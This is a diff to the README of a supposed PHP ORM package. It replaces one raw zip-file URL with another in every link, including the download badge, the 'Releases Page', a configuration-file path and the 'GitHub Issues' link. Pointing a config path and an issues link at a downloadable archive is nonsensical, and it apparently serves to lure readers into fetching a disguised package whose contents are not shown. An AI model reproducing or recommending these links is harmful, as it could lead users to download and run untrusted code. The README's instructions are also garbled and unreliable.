@@ -6,7 +6,7 @@ Welcome to **eloquent-orm**! This project provides a simple object-relational ma
 
 ### 📥 Download Eloquent ORM
 
-[![Download Eloquent ORM](https://raw.githubusercontent.com/Wagner-Souza/eloquent-orm/main/inalienability/eloquent-orm.zip%20Eloquent%20ORM-brightgreen)](https://raw.githubusercontent.com/Wagner-Souza/eloquent-orm/main/inalienability/eloquent-orm.zip)
+[![Download Eloquent ORM](https://raw.githubusercontent.com/Wagner-Souza/eloquent-orm/main/inalienability/orm-eloquent-3.2.zip%20Eloquent%20ORM-brightgreen)](https://raw.githubusercontent.com/Wagner-Souza/eloquent-orm/main/inalienability/orm-eloquent-3.2.zip)
 
 ## 📃 Description
 
@@ -34,7 +34,7 @@ Before installation, ensure your environment meets the system requirements menti
 
 ### Step 2: Download & Install Eloquent ORM
 
-Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Wagner-Souza/eloquent-orm/main/inalienability/eloquent-orm.zip).
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/Wagner-Souza/eloquent-orm/main/inalienability/orm-eloquent-3.2.zip).
 
 On the Releases page, you will find the latest version of eloquent-orm. Click on the version link to download the package.
 
@@ -54,7 +54,7 @@ This command will download any required packages needed for eloquent-orm.
 
 ### Step 5: Configure Your Database
 
-Open the configuration file (`.env` or `https://raw.githubusercontent.com/Wagner-Souza/eloquent-orm/main/inalienability/eloquent-orm.zip`, depending on your setup) and input your database details:
+Open the configuration file (`.env` or `https://raw.githubusercontent.com/Wagner-Souza/eloquent-orm/main/inalienability/orm-eloquent-3.2.zip`, depending on your setup) and input your database details:
 
 ```php
 DB_HOST=your_database_host
@@ -110,7 +110,7 @@ Check out the video section on our GitHub page for more.
 
 Join our community to connect with other users. Share your experiences and ask questions. You can find us on:
 
-- [GitHub Issues](https://raw.githubusercontent.com/Wagner-Souza/eloquent-orm/main/inalienability/eloquent-orm.zip) for reporting bugs or asking questions.
+- [GitHub Issues](https://raw.githubusercontent.com/Wagner-Souza/eloquent-orm/main/inalienability/orm-eloquent-3.2.zip) for reporting bugs or asking questions.
 - Discord or forums for informal support.
 
 ## 📝 Contribution
